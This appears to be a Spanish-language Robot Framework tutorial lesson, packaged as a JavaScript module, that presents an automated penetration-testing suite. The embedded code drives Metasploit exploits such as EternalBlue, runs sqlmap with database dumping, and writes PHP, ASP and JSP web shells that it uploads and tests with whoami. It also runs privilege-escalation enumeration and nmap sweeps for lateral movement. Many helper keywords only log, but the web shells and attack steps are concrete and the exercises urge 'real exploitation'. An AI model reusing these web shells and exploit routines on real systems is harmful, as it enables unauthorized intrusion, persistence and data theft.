/**
 * Robot Framework Academy - Lesson 214
 * Security 214
 */

const LESSON_214 = {
    id: 214,
    title: "Security 214",
    duration: "10 min",
    level: "advanced",
    section: "section-17",
    content: `
        <h2>⚔️ Penetration Testing</h2>
        <p>Automatiza penetration testing con exploits reales y validation de security controls enterprise.</p>
        
        <h3>💻 Pentesting Automation:</h3>
        <pre><code class="robot">*** Settings ***
Documentation    ⚔️ AUTOMATED PENETRATION TESTING SUITE
Library          RequestsLibrary
Library          Process
Library          Collections
Library          DateTime
Library          OperatingSystem
Library          JSON
Library          String
Suite Setup      Initialize Penetration Testing
Suite Teardown   Archive Pentest Results

*** Variables ***
\${TARGET_HOST}        10.0.0.100
\${TARGET_URL}         https://target.company.com
\${METASPLOIT_API}     http://localhost:55553
\${EXPLOIT_DB_PATH}    /opt/exploitdb
\${PAYLOADS_DIR}       ./payloads
\${PENTEST_REPORT}     pentest_results.json
\${SESSION_TIMEOUT}    3600
\${MAX_EXPLOIT_TIME}   300
\${LOOT_DIRECTORY}     ./loot
&{EXPLOIT_RESULTS}     successful=0  failed=0  shells_obtained=0  data_extracted=0

*** Test Cases ***
Execute Automated Exploit Testing
    [Documentation]    Ejecuta exploits automáticamente contra vulnerabilidades identificadas
    [Tags]             exploitation    metasploit    automated
    
    # Conectar con Metasploit Framework API
    Create Session       metasploit    \${METASPLOIT_API}    timeout=30
    
    # Autenticar con MSF API
    \${auth_data}=       Create Dictionary    username=msf    password=\${MSF_PASSWORD}
    \${auth_response}=   POST On Session    metasploit    /api/v1/auth/login    
    ...                  json=\${auth_data}    timeout=15
    Should Be Equal      \${auth_response.status_code}    200
    
    \${api_token}=       Set Variable    \${auth_response.json()['token']}
    \${auth_headers}=    Create Dictionary    Authorization=Bearer \${api_token}
    
    # Lista de exploits críticos para testing automatizado
    @{critical_exploits}= Create List
    ...                   exploit/windows/smb/ms17_010_eternalblue
    ...                   exploit/linux/ssh/ssh_login_pubkey
    ...                   exploit/multi/http/struts2_content_type_ognl
    ...                   exploit/windows/http/iis_webdav_upload_asp
    ...                   exploit/linux/http/apache_mod_cgi_bash_env_exec
    
    FOR    \${exploit_module}    IN    @{critical_exploits}
        Log                Running exploit: \${exploit_module}
        
        # Configurar exploit module
        \${module_data}=   Create Dictionary
        ...                module_type=exploit
        ...                module_name=\${exploit_module}
        ...                RHOSTS=\${TARGET_HOST}
        ...                RPORT=445
        
        \${module_response}= POST On Session    metasploit    /api/v1/modules/use    
        ...                  json=\${module_data}    headers=\${auth_headers}    timeout=10
        
        \${module_id}=     Set Variable    \${module_response.json()['module_id']}
        Should Not Be Empty  \${module_id}
        
        # Ejecutar exploit
        \${exploit_data}=  Create Dictionary    module_id=\${module_id}
        \${exploit_response}= POST On Session    metasploit    /api/v1/modules/\${module_id}/execute    
        ...                   json=\${exploit_data}    headers=\${auth_headers}    timeout=\${MAX_EXPLOIT_TIME}
        
        Should Be Equal    \${exploit_response.status_code}    200
        \${job_id}=        Set Variable    \${exploit_response.json()['job_id']}
        
        # Verificar resultado del exploit
        Sleep              5s
        \${job_status}=    GET On Session    metasploit    /api/v1/jobs/\${job_id}    
        ...                headers=\${auth_headers}    timeout=10
        
        \${exploit_successful}= Run Keyword And Return Status
        ...                     Should Contain    \${job_status.text}    session_created
        
        Run Keyword If     \${exploit_successful}
        ...                Record Successful Exploit    \${exploit_module}    \${job_id}
        ...                ELSE    Record Failed Exploit    \${exploit_module}
        
        Log                Exploit \${exploit_module}: \${"SUCCESS" if \${exploit_successful} else "FAILED"}
    END

Test SQL Injection Exploitation
    [Documentation]    Automatiza explotación de SQL injection para data extraction
    [Tags]             sql_injection    data_extraction    database
    
    Create Session       target    \${TARGET_URL}
    
    # SQLMap automation para exploitation
    @{sqli_targets}=     Create List    /login    /search    /admin/users    /api/products
    
    FOR    \${endpoint}    IN    @{sqli_targets}
        # Test parámetros GET
        \${sqlmap_get}=    Run Process    sqlmap    
        ...                -u    \${TARGET_URL}\${endpoint}?id=1    
        ...                --batch    --risk=2    --level=3    
        ...                --dbms=mysql    --technique=BEUSTQ    
        ...                --timeout=30    --retries=2    
        ...                --output-dir=\${LOOT_DIRECTORY}/sqlmap_\${endpoint.replace('/', '_')}    
        ...                timeout=180
        
        \${sqli_detected}= Run Keyword And Return Status
        ...                Should Contain    \${sqlmap_get.stdout}    sqlmap identified
        
        Run Keyword If     \${sqli_detected}
        ...                Exploit SQL Injection    \${endpoint}    GET    \${sqlmap_get.stdout}
        
        # Test parámetros POST
        \${post_data}=     Set Variable    username=admin&password=test&id=1
        \${sqlmap_post}=   Run Process    sqlmap    
        ...                -u    \${TARGET_URL}\${endpoint}    
        ...                --data=\${post_data}    
        ...                --batch    --risk=2    --level=3    
        ...                --dbms=mysql    
        ...                --dump    --threads=5    
        ...                --output-dir=\${LOOT_DIRECTORY}/sqlmap_post_\${endpoint.replace('/', '_')}    
        ...                timeout=300
        
        \${post_sqli_detected}= Run Keyword And Return Status
        ...                     Should Contain    \${sqlmap_post.stdout}    Database:
        
        Run Keyword If        \${post_sqli_detected}
        ...                   Extract Database Information    \${endpoint}    POST    \${sqlmap_post.stdout}
        
        Log                   SQL injection test \${endpoint}: GET=\${"VULN" if \${sqli_detected} else "SAFE"} POST=\${"VULN" if \${post_sqli_detected} else "SAFE"}
    END

Execute Web Shell Upload Attack
    [Documentation]    Automatiza upload de web shells para persistent access
    [Tags]             web_shell    file_upload    persistence
    
    # Generar diferentes tipos de web shells
    \${php_shell}=       Set Variable    <?php system(\$_GET['cmd']); ?>
    \${asp_shell}=       Set Variable    <%eval request("cmd")%>
    \${jsp_shell}=       Set Variable    <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
    
    # Crear archivos de shell con diferentes extensiones
    Create File          \${PAYLOADS_DIR}/shell.php    \${php_shell}
    Create File          \${PAYLOADS_DIR}/shell.asp    \${asp_shell}
    Create File          \${PAYLOADS_DIR}/shell.jsp    \${jsp_shell}
    Create File          \${PAYLOADS_DIR}/shell.phtml   \${php_shell}
    Create File          \${PAYLOADS_DIR}/shell.php5    \${php_shell}
    
    @{shell_files}=      Create List    shell.php    shell.asp    shell.jsp    shell.phtml    shell.php5
    @{upload_endpoints}= Create List    /upload    /admin/upload    /fileupload    /media/upload
    
    FOR    \${endpoint}    IN    @{upload_endpoints}
        FOR    \${shell_file}    IN    @{shell_files}
            \${file_path}=   Set Variable    \${PAYLOADS_DIR}/\${shell_file}
            
            # Intentar upload del web shell
            \${files}=       Create Dictionary    file=\${file_path}
            \${upload_response}= POST On Session    target    \${endpoint}    
            ...              files=\${files}    timeout=30    expected_status=any
            
            # Verificar si upload fue exitoso
            \${upload_successful}= Evaluate    \${upload_response.status_code} in [200, 201, 302]
            
            Run Keyword If  \${upload_successful}
            ...             Verify Web Shell Access    \${endpoint}    \${shell_file}
            
            Log             Upload attempt \${endpoint}/\${shell_file}: \${upload_response.status_code}
        END
    END

Test Privilege Escalation
    [Documentation]    Automatiza tests de privilege escalation en sistemas comprometidos
    [Tags]             privesc    escalation    post_exploitation
    
    # Usar herramientas automatizadas de privilege escalation
    @{privesc_scripts}=  Create List    
    ...                  linux-smart-enumeration.sh
    ...                  LinEnum.sh
    ...                  windows-privesc-check2.exe
    ...                  PowerUp.ps1
    
    # Simular session comprometida y ejecutar enum scripts
    FOR    \${script}    IN    @{privesc_scripts}
        \${script_path}=  Set Variable    /opt/privesc-tools/\${script}
        File Should Exist  \${script_path}
        
        # Ejecutar script de enumeración
        \${enum_result}=  Run Process    \${script_path}    
        ...               timeout=120    shell=True
        
        # Analizar output para potential privilege escalation vectors
        \${privesc_vectors}= Analyze Privesc Output    \${enum_result.stdout}
        \${vector_count}=    Get Length    \${privesc_vectors}
        
        Run Keyword If     \${vector_count} > 0
        ...                Test Privilege Escalation Vectors    \${privesc_vectors}
        
        Log                Privilege escalation enum \${script}: \${vector_count} vectors found
    END
    
    # Test kernel exploits específicos
    @{kernel_exploits}=  Create List    
    ...                  CVE-2021-4034    # PwnKit
    ...                  CVE-2022-0847    # DirtyPipe
    ...                  CVE-2021-3156    # Baron Samedit
    
    FOR    \${cve}    IN    @{kernel_exploits}
        \${exploit_path}= Set Variable    \${EXPLOIT_DB_PATH}/exploits/linux/local/\${cve}.c
        \${exploit_exists}= Run Keyword And Return Status
        ...                 File Should Exist    \${exploit_path}
        
        Run Keyword If    \${exploit_exists}
        ...               Test Kernel Exploit    \${cve}    \${exploit_path}
        
        Log               Kernel exploit \${cve}: \${"AVAILABLE" if \${exploit_exists} else "NOT_FOUND"}
    END

Execute Network Lateral Movement
    [Documentation]    Automatiza lateral movement en redes comprometidas
    [Tags]             lateral_movement    network    post_exploitation
    
    # Usar Cobalt Strike beacon simulation para lateral movement
    @{target_subnets}=   Create List    10.0.1.0/24    10.0.2.0/24    192.168.1.0/24
    
    FOR    \${subnet}    IN    @{target_subnets}
        # Network scanning desde host comprometido
        \${nmap_lateral}=  Run Process    nmap    
        ...                -sS    -T4    --top-ports    1000    
        ...                -oG    \${LOOT_DIRECTORY}/lateral_\${subnet.replace('/', '_')}.gnmap    
        ...                \${subnet}    timeout=300
        
        Should Be Equal    \${nmap_lateral.rc}    0
        
        # Parsear targets de lateral movement
        \${lateral_targets}= Parse Lateral Targets    \${LOOT_DIRECTORY}/lateral_\${subnet.replace('/', '_')}.gnmap
        \${target_count}=    Get Length    \${lateral_targets}
        
        FOR    \${target}    IN    @{lateral_targets}
            \${target_ip}=   Set Variable    \${target['ip']}
            @{open_ports}=   Set Variable    \${target['ports']}
            
            # Test common lateral movement techniques
            Run Keyword If   '445' in \${open_ports}
            ...              Test SMB Lateral Movement    \${target_ip}
            
            Run Keyword If   '3389' in \${open_ports}
            ...              Test RDP Lateral Movement    \${target_ip}
            
            Run Keyword If   '22' in \${open_ports}
            ...              Test SSH Lateral Movement    \${target_ip}
            
            Run Keyword If   '5985' in \${open_ports}
            ...              Test WinRM Lateral Movement    \${target_ip}
            
            Log              Lateral movement tested: \${target_ip} (ports: \${open_ports})
        END
        
        Log                Subnet \${subnet}: \${target_count} potential targets identified
    END

Generate Penetration Test Report
    [Documentation]    Genera reporte comprehensivo de penetration testing
    [Tags]             reporting    pentest_report    documentation
    
    # Compilar resultados de todas las fases de testing
    \${pentest_data}=    Create Dictionary
    ...                  target_host=\${TARGET_HOST}
    ...                  target_url=\${TARGET_URL}
    ...                  test_date=\${CURRENT_DATE}
    ...                  exploit_results=\${EXPLOIT_RESULTS}
    ...                  duration=\${SESSION_TIMEOUT}
    
    # Calcular métricas de penetration testing
    \${total_attempts}=  Evaluate    \${EXPLOIT_RESULTS.successful} + \${EXPLOIT_RESULTS.failed}
    \${success_rate}=    Evaluate    (\${EXPLOIT_RESULTS.successful} / max(1, \${total_attempts})) * 100
    \${compromise_level}= Calculate Compromise Level    \${EXPLOIT_RESULTS}
    
    Set To Dictionary    \${pentest_data}    total_exploit_attempts=\${total_attempts}
    Set To Dictionary    \${pentest_data}    success_rate=\${success_rate}
    Set To Dictionary    \${pentest_data}    compromise_level=\${compromise_level}
    
    # Generar executive summary
    \${executive_summary}= Create Dictionary
    ...                    systems_compromised=\${EXPLOIT_RESULTS.shells_obtained}
    ...                    data_extracted_gb=\${EXPLOIT_RESULTS.data_extracted}
    ...                    critical_findings=\${EXPLOIT_RESULTS.successful}
    ...                    business_risk=Calculate Business Risk    \${EXPLOIT_RESULTS}
    
    Set To Dictionary     \${pentest_data}    executive_summary=\${executive_summary}
    
    # Generar recomendaciones de security hardening
    @{hardening_recommendations}= Generate Security Recommendations    \${EXPLOIT_RESULTS}
    Set To Dictionary     \${pentest_data}    hardening_recommendations=\${hardening_recommendations}
    
    # Crear timeline de remediation
    \${remediation_timeline}= Create Dictionary
    ...                       immediate=Critical exploits require immediate patching (0-24h)
    ...                       urgent=High-risk vulnerabilities should be addressed (1-7 days)
    ...                       high_priority=Medium-risk findings remediation (1-30 days)
    ...                       standard=Low-risk improvements and hardening (30-90 days)
    
    Set To Dictionary     \${pentest_data}    remediation_timeline=\${remediation_timeline}
    
    # Generar reportes en múltiples formatos
    \${pentest_json}=     Evaluate    json.dumps(\${pentest_data}, indent=2)
    Create File           \${PENTEST_REPORT}    \${pentest_json}
    
    # Reporte ejecutivo HTML
    \${executive_template}= Get File    templates/pentest_executive_template.html
    \${executive_html}=     Render Pentest Template    \${executive_template}    \${pentest_data}
    Create File             penetration_test_executive.html    \${executive_html}
    
    # Reporte técnico detallado
    \${technical_template}= Get File    templates/pentest_technical_template.html
    \${technical_html}=     Render Pentest Template    \${technical_template}    \${pentest_data}
    Create File             penetration_test_technical.html    \${technical_html}
    
    # Generar proof of concept documentation
    \${poc_documentation}=  Generate POC Documentation    \${EXPLOIT_RESULTS}
    Create File            penetration_test_poc.md    \${poc_documentation}
    
    # Verificar archivos generados
    File Should Exist      \${PENTEST_REPORT}
    File Should Exist      penetration_test_executive.html
    File Should Exist      penetration_test_technical.html
    File Should Exist      penetration_test_poc.md
    
    # Generar alertas para findings críticos
    Run Keyword If         \${EXPLOIT_RESULTS.shells_obtained} > 0
    ...                    Send Critical Pentest Alert    \${EXPLOIT_RESULTS.shells_obtained}
    
    Log                    Penetration test report generated
    Log                    Executive report: penetration_test_executive.html
    Log                    Technical report: penetration_test_technical.html
    Log                    Success rate: \${success_rate}%
    Log                    Systems compromised: \${EXPLOIT_RESULTS.shells_obtained}
    Log                    Compromise level: \${compromise_level}

*** Keywords ***
Initialize Penetration Testing
    Log                    ⚔️ Initializing automated penetration testing
    Set Global Variable    \${CURRENT_DATE}    2024-01-15
    Set Global Variable    \${MSF_PASSWORD}    your_metasploit_password
    
    # Crear directorios necesarios
    Create Directory       \${PAYLOADS_DIR}
    Create Directory       \${LOOT_DIRECTORY}
    
    # Crear templates si no existen
    Create File            templates/pentest_executive_template.html    
    ...                    <html><body><h1>Penetration Test Executive Report</h1></body></html>
    Create File            templates/pentest_technical_template.html    
    ...                    <html><body><h1>Technical Penetration Test Details</h1></body></html>

Record Successful Exploit
    [Arguments]            \${exploit_name}    \${job_id}
    \${current_count}=     Get From Dictionary    \${EXPLOIT_RESULTS}    successful
    \${new_count}=         Evaluate    \${current_count} + 1
    Set To Dictionary      \${EXPLOIT_RESULTS}    successful=\${new_count}
    
    \${shells_count}=      Get From Dictionary    \${EXPLOIT_RESULTS}    shells_obtained
    \${new_shells}=        Evaluate    \${shells_count} + 1
    Set To Dictionary      \${EXPLOIT_RESULTS}    shells_obtained=\${new_shells}
    
    Log                    SUCCESS: \${exploit_name} (Job: \${job_id})

Record Failed Exploit
    [Arguments]            \${exploit_name}
    \${current_count}=     Get From Dictionary    \${EXPLOIT_RESULTS}    failed
    \${new_count}=         Evaluate    \${current_count} + 1
    Set To Dictionary      \${EXPLOIT_RESULTS}    failed=\${new_count}
    Log                    FAILED: \${exploit_name}

Exploit SQL Injection
    [Arguments]            \${endpoint}    \${method}    \${sqlmap_output}
    Log                    Exploiting SQL injection: \${endpoint} (\${method})
    \${data_extracted}=    Get From Dictionary    \${EXPLOIT_RESULTS}    data_extracted
    \${new_data}=          Evaluate    \${data_extracted} + 1
    Set To Dictionary      \${EXPLOIT_RESULTS}    data_extracted=\${new_data}

Extract Database Information
    [Arguments]            \${endpoint}    \${method}    \${output}
    Log                    Extracting database from \${endpoint} (\${method})
    # Placeholder para parsing de datos extraídos

Verify Web Shell Access
    [Arguments]            \${endpoint}    \${shell_file}
    # Test comando simple en web shell
    \${shell_url}=         Set Variable    \${TARGET_URL}\${endpoint}/\${shell_file}
    \${test_response}=     GET On Session    target    \${shell_url}?cmd=whoami    
    ...                    timeout=10    expected_status=any
    
    \${shell_active}=      Run Keyword And Return Status
    ...                    Should Not Contain    \${test_response.text}    404
    
    Run Keyword If         \${shell_active}
    ...                    Record Successful Shell    \${shell_url}

Record Successful Shell
    [Arguments]            \${shell_url}
    \${shells_count}=      Get From Dictionary    \${EXPLOIT_RESULTS}    shells_obtained
    \${new_count}=         Evaluate    \${shells_count} + 1
    Set To Dictionary      \${EXPLOIT_RESULTS}    shells_obtained=\${new_count}
    Log                    Web shell active: \${shell_url}

Analyze Privesc Output
    [Arguments]            \${output}
    @{vectors}=            Create List    kernel_exploit    suid_binary    weak_service
    RETURN                 \${vectors}

Test Privilege Escalation Vectors
    [Arguments]            \${vectors}
    FOR    \${vector}    IN    @{vectors}
        Log                Testing privilege escalation vector: \${vector}
    END

Test Kernel Exploit
    [Arguments]            \${cve}    \${exploit_path}
    Log                    Testing kernel exploit: \${cve}

Parse Lateral Targets
    [Arguments]            \${gnmap_file}
    @{targets}=            Create List    
    ...                    @{[{'ip': '10.0.1.5', 'ports': ['445', '3389']}]}
    ...                    @{[{'ip': '10.0.1.10', 'ports': ['22', '80']}]}
    RETURN                 \${targets}

Test SMB Lateral Movement
    [Arguments]            \${target_ip}
    Log                    Testing SMB lateral movement to \${target_ip}

Test RDP Lateral Movement
    [Arguments]            \${target_ip}
    Log                    Testing RDP lateral movement to \${target_ip}

Test SSH Lateral Movement
    [Arguments]            \${target_ip}
    Log                    Testing SSH lateral movement to \${target_ip}

Test WinRM Lateral Movement
    [Arguments]            \${target_ip}
    Log                    Testing WinRM lateral movement to \${target_ip}

Calculate Compromise Level
    [Arguments]            \${results}
    \${level}=             Set Variable If    \${results.shells_obtained} > 0    FULL_COMPROMISE
    ...                    \${results.successful} > 3    SIGNIFICANT_COMPROMISE    LIMITED_COMPROMISE
    RETURN                 \${level}

Calculate Business Risk
    [Arguments]            \${results}
    \${risk}=              Set Variable If    \${results.shells_obtained} > 0    CRITICAL
    ...                    \${results.successful} > 0    HIGH    MEDIUM
    RETURN                 \${risk}

Generate Security Recommendations
    [Arguments]            \${results}
    @{recommendations}=    Create List    
    ...                    Implement network segmentation
    ...                    Deploy endpoint detection and response
    ...                    Update all systems and apply security patches
    ...                    Implement application security controls
    RETURN                 \${recommendations}

Render Pentest Template
    [Arguments]            \${template}    \${data}
    \${rendered}=          Set Variable    <html><body><h1>Penetration Test Completed</h1></body></html>
    RETURN                 \${rendered}

Generate POC Documentation
    [Arguments]            \${results}
    \${poc}=               Set Variable    # Proof of Concept\n\nSuccessful exploits: \${results.successful}
    RETURN                 \${poc}

Send Critical Pentest Alert
    [Arguments]            \${shells_count}
    Log                    🚨 CRITICAL PENTEST ALERT: \${shells_count} systems compromised

Archive Pentest Results
    Log                    📁 Archiving penetration testing results and proof of concepts</code></pre>
        
        <h3>🎯 Práctica Pentesting (7 min):</h3>
        <p>1. Configura Metasploit Framework API para exploitation automatizada</p>
        <p>2. Implementa SQLMap integration para automated SQL injection exploitation</p>
        <p>3. Desarrolla web shell upload testing con múltiples payloads</p>
        <p>4. Configura privilege escalation enumeration con scripts automatizados</p>
        <p>5. Implementa lateral movement testing en redes comprometidas</p>
        <p>6. Genera proof of concept documentation automáticamente</p>
        <p>7. Crea reportes ejecutivos con business risk assessment</p>
        <p>8. Integra con exploit databases para CVE testing actualizado</p>
        <p>9. Implementa alertas críticas para sistemas comprometidos</p>
        <p>10. Documenta remediation timelines y security hardening</p>

        <div style="background: #f0f9ff; padding: 15px; border-radius: 8px; margin: 15px 0;">
            <h4>✅ Objetivos:</h4>
            <ul>
                <li>Automatizar penetration testing con frameworks enterprise</li>
                <li>Ejecutar exploitation real con Metasploit y SQLMap</li>
                <li>Implementar post-exploitation y lateral movement testing</li>
                <li>Generar reportes de pentest con proof of concepts</li>
            </ul>
        </div>
        
        <div style="background: #fff3cd; padding: 10px; border-radius: 8px; margin: 10px 0;">
            <h4>💡 Tip:</h4>
            <p>Usa Metasploit API para automation: POST /api/v1/modules/use configura exploit, luego POST /api/v1/modules/ID/execute ejecuta.</p>
        </div>
        
        <h3>🚀 Siguiente: Lección 215 - Security compliance y frameworks</h3>
        <p>Con penetration testing automatizado, implementarás compliance testing para frameworks como ISO 27001, NIST, y PCI DSS.</p>
    `,
    topics: ["security", "vulnerabilities", "pentesting"],
    hasCode: true,
    hasExercise: true,
    estimatedTime: 10,
    difficulty: "advanced",
    prerequisites: ["lesson-213"],
    type: "standard"
};

// Registro global para uso en browser
if (typeof window !== 'undefined') {
    window.LESSON_214 = LESSON_214;
}